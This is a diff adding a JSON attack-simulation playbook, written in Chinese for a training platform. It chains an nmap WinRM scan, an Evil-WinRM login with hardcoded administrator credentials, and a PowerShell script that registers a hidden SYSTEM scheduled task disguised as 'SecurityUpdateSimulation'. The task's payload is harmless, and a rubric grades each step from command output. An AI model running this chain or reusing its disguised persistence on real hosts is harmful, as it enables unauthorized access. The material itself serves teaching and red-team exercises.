@@ -1,0 +1,170 @@
+{
+  "id": "winrm_trojan_simulation",
+  "name": "Windows 木马持久化完整攻击链",
+  "description": "教学目的：模拟远程攻击者从侦察发现、凭据验证到木马植入的完整攻击链。通过 Evil-WinRM 远程命令通道在 Windows 靶标上创建无害的计划任务，演示 MITRE ATT&CK 的 Discovery → Remote Services → Persistence 全流程。\n\n前置条件：攻击者已通过其他方式获取目标 Windows 主机的管理员凭据（username/password），这些凭据作为战术手册输入通过 win_profile 或环境变量提供。本战术手册演示的是凭据到手后的完整攻击链操作。",
+  "category": "lateral-movement",
+  "difficulty": "medium",
+  "estimatedDuration": "8 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Discovery",
+    "Execution",
+    "Persistence"
+  ],
+  "mitreTechniques": [
+    "T1046",
+    "T1021.006",
+    "T1053.005",
+    "T1059.001"
+  ],
+  "targetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "win_profile": {
+    "username": "Administrator",
+    "password": "200209",
+    "winrm_port": "5985"
+  },
+  "steps": [
+    {
+      "id": "step1_recon_winrm_port",
+      "name": "侦察 — 扫描 WinRM 端口",
+      "description": "使用 nmap 对目标进行端口扫描，检测 WinRM 服务端口（默认 5985）是否开放。模拟攻击者在侦察阶段发现远程管理入口。",
+      "toolId": "nmap",
+      "argsTemplate": [
+        "-sV",
+        "-p",
+        "{{winrm_port}}",
+        "--open",
+        "-Pn",
+        "{{host}}"
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1046"
+      ],
+      "payload_id": "port-scan"
+    },
+    {
+      "id": "step2_credential_validation",
+      "name": "凭据验证 — Evil-WinRM 基础连接",
+      "description": "使用提供的凭据通过 Evil-WinRM 连接目标，执行默认信息查询（whoami / hostname / ipconfig）。验证凭据有效性的同时收集目标基本信息。凭据来自 win_profile 或环境变量，代表攻击者在此阶段已获取有效身份。",
+      "toolId": "evil-winrm",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "{{username}}",
+        "-p",
+        "{{password}}",
+        "--port",
+        "{{winrm_port}}"
+      ],
+      "score": 15,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1021.006"
+      ],
+      "payload_id": "lateral-winrm"
+    },
+    {
+      "id": "step3_prepare_trojan_script",
+      "name": "载荷准备 — 生成木马安装脚本",
+      "description": "在本地生成一个 PowerShell 脚本，该脚本将在目标机器上注册模拟木马的计划任务并在注册后立即自验证。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "cat > /tmp/install_trojan.ps1 << 'PSEOF'\nRegister-ScheduledTask -TaskName 'SecurityUpdateSimulation' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command \"echo TrojanRunning > C:\\Users\\Public\\trojan.txt\"') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)) -User 'SYSTEM' -Force\n\nWrite-Output '--- VERIFICATION ---'\nGet-ScheduledTask -TaskName 'SecurityUpdateSimulation' -ErrorAction SilentlyContinue | Format-List TaskName, State, Actions\nPSEOF\necho 'Script created: /tmp/install_trojan.ps1'"
+      ],
+      "score": 15,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.001"
+      ]
+    },
+    {
+      "id": "step4_deploy_and_verify",
+      "name": "植入并验证 — 远程执行木马脚本",
+      "description": "通过 Evil-WinRM 上传并执行木马部署脚本，在目标上创建驻留计划任务。脚本执行完毕后会立即查询并输出计划任务注册状态，确认持久化植入成功。",
+      "toolId": "evil-winrm",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "{{username}}",
+        "-p",
+        "{{password}}",
+        "--port",
+        "{{winrm_port}}",
+        "-s",
+        "/tmp/install_trojan.ps1"
+      ],
+      "score": 60,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1053.005"
+      ],
+      "payload_id": "lateral-winrm"
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "winrm_port_open",
+        "desc": "nmap 扫描发现 WinRM 端口开放",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "open|5985"
+        }
+      },
+      {
+        "id": "credential_valid",
+        "desc": "凭据有效，Evil-WinRM 连接成功",
+        "points": 15,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Evil-WinRM|whoami|Connected"
+        }
+      },
+      {
+        "id": "trojan_script_created",
+        "desc": "木马安装脚本创建成功",
+        "points": 15,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Script created|install_trojan.ps1"
+        }
+      },
+      {
+        "id": "trojan_deployed_and_verified",
+        "desc": "计划任务注册成功并自验证通过",
+        "points": 60,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "SecurityUpdateSimulation|VERIFICATION|Connected successfully"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "local_ip",
+    "web_url"
+  ],
+  "baselineGroup": "windows-exploitation",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "木马自启动项在远程 Windows 靶机中注册；需要 Windows 靶机开放 WinRM 端口且提供有效的管理员凭据",
+  "applicableTargetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "teachingObjective": "演示完整远程攻击链：侦察发现 WinRM 服务 → 凭据验证 → 载荷准备 → 通过计划任务（T1053.005）实现持久化植入并自验证。本战术手册诚实标注凭据为前置输入，模拟攻击者已获取有效身份后的操作流程。",
+  "target_class": "windows_ad",
+  "disableAutoInsert": true
+}
